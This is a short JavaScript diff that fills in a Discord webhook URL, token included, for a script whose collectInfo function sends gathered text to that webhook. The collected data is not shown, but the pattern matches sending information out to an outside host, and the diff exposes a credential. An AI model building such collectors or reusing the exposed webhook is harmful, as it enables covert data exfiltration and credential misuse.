@@ -1,4 +1,5 @@
-const WEBHOOK_URL = "ここにWebhookのURL";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1473407042386657337/0p7qjy0j6WBEZx9uk-VsWH969YtpGdXSOdOXPqeObMWCAU-IquF6Dp4hN1fh3TMz3six
+";
 
 function sendToDiscord(data) {
   fetch(WEBHOOK_URL, {
@@ -48,3 +49,4 @@ function collectInfo() {
     sendToDiscord(text);
   }
 }
+
